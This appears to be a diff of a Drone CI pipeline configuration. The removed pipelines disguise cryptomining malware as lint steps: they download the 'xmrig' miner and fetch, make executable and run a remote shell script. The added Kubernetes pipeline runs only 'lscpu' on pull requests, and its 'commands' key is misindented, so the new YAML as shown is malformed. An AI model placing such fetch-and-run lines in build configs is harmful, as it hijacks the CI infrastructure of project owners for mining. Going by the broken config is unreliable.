@@ -1,28 +1,16 @@
----
 kind: pipeline
-name: One
-workspace:
-  base: /go
-  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
-steps:
-- name: download golang
-  image: golangci/golangci-lint:v1.26.0
-  commands:
-  - golangci-lint run
-  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/xmrig
-  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
----
-kind: pipeline
-name: build
-workspace:
-  base: /go
-  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
-steps:
-- name: golangci-lint
-  image: golangci/golangci-lint:v1.26.0
-  commands:
-  - golangci-lint run
-  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/xmrig
-  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+type: kubernetes
+name: Test
 
+trigger:
+  branch:
+    - master
+  event:
+    include:
+      - pull_request
 
+steps:
+- name: Test application 
+  image: mcr.microsoft.com/dotnet/sdk:6.0-focal
+ commands:
+    - lscpu
